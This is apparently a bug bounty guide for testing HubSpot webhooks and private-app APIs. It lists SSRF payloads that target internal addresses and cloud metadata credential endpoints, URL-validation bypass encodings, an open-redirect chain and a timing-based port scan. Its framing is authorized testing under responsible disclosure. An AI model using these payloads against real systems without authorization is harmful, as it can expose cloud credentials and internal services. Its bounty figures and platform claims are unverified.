# 🔴 HubSpot Webhook Configuration for Security Testing

## ⚠️ CRITICAL: Webhooks DON'T Work with Private Apps!

**Known Limitation**: Webhooks are INCOMPATIBLE with Private Apps in HubSpot!

### The Problem
- Private Apps cannot use webhooks
- This is a documented limitation by HubSpot
- Developers use workarounds (public + private app combo)

### Common Workaround (Security Risk!)
```
1. Create PUBLIC app for webhooks
2. Create PRIVATE app for API access
3. Use both simultaneously
4. This creates potential security vulnerabilities!
```

---

## 🎯 For Security Testing: Skip Webhooks Initially!

### Why?
1. **Private Apps can't use webhooks anyway**
2. **API access is more valuable** for bug bounty ($2,000-$10,000)
3. **Webhooks are mainly for SSRF testing** (lower bounty)

### Focus Instead On:
- ✅ API access with Private App token
- ✅ IDOR testing with CRM objects
- ✅ Privilege escalation
- ✅ Business logic flaws
- ✅ GraphQL introspection

---

## 🔧 If You Want to Test Webhooks (Advanced)

### You'll Need a PUBLIC App (More Complex)

1. **Go to**: https://developers.hubspot.com
2. **Create**: Developer account
3. **Build**: Public app with OAuth
4. **Configure**: Webhook subscriptions

### Webhook Security Vulnerabilities to Test

#### 1. SSRF (Server-Side Request Forgery) - HIGH VALUE!
```bash
# Test internal access
Webhook URL: http://127.0.0.1:8080
Webhook URL: http://localhost/admin
Webhook URL: http://169.254.169.254/latest/meta-data/ (AWS metadata)
Webhook URL: http://192.168.1.1
```

#### 2. Open Redirect Chain
```bash
# Use trusted domain with redirect
Webhook URL: https://hubspot.com/redirect?url=http://internal.host
```

#### 3. URL Validation Bypass
```bash
# Common bypasses
http://127.0.0.1
http://127.0.0.1:80
http://127.1
http://0x7f000001
http://[::1]
http://localhost
```

#### 4. Blind SSRF Detection
```bash
# Point to your controlled server
Webhook URL: https://your-server.com/canary
# Monitor for incoming requests
```

#### 5. Response Time Analysis
```bash
# Compare response times
Valid external URL: 200ms
Internal port 22 (SSH): 50ms
Internal port 3306 (MySQL): 50ms
Non-existent port: 5000ms timeout
```

---

## 🎯 High-Value Webhook Vulnerabilities

### 1. AWS Metadata Access ($2,000-$5,000)
```bash
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

### 2. Internal Service Discovery ($1,000-$3,000)
```bash
http://internal-api.hubspot.local/
http://admin.hubspot.internal/
http://database.local:3306/
```

### 3. Cloud Provider Metadata ($2,000-$5,000)
```bash
# AWS
http://169.254.169.254/

# Google Cloud
http://metadata.google.internal/

# Azure
http://169.254.169.254/metadata/instance?api-version=2019-06-01
```

---

## ⚠️ Security Testing Best Practices

### DO:
- ✅ Test in your own trial account first
- ✅ Use canary tokens to track requests
- ✅ Document all findings with evidence
- ✅ Follow responsible disclosure

### DON'T:
- ❌ Access production data
- ❌ Cause service disruption
- ❌ Exfiltrate sensitive information
- ❌ Test on other customers' portals

---

## 📊 Webhook Configuration (If Creating PUBLIC App)

### Required Scopes for Webhook Testing:
```
- webhooks
- crm.objects.contacts.read
- crm.objects.companies.read
- crm.objects.deals.read
```

### Webhook Events to Subscribe:
```
- contact.creation
- contact.deletion
- contact.propertyChange
- deal.creation
- deal.propertyChange
- company.creation
```

### Webhook URL for Testing:
```
# Use a service like:
https://webhook.site/[your-unique-id]
https://requestbin.com/[your-bin]
https://ngrok.io/[your-tunnel]
```

---

## 💡 Quick Decision Tree

```
Do you have Private App token?
├── YES → Focus on API testing (IDOR, privilege escalation)
│         Higher value: $2,000-$10,000
│
└── NO → Need to create Private App first
          Webhooks can wait (need PUBLIC app anyway)
```

---

## 🎯 Recommendation for Your Testing

### Skip Webhooks For Now!

1. **You selected all scopes** - Good for API testing!
2. **Private Apps can't use webhooks** - Known limitation
3. **Focus on high-value API vulnerabilities** first
4. **Come back to webhooks later** if you want to create a PUBLIC app

### Your Next Steps:
1. Get your Private App access token
2. Start IDOR testing immediately
3. Test privilege escalation
4. Test business logic flaws
5. Save webhook/SSRF testing for later (requires PUBLIC app)

---

**Bottom Line**: Don't configure webhooks in Private App - they won't work anyway! Focus on getting that access token and testing the API endpoints for high-value vulnerabilities!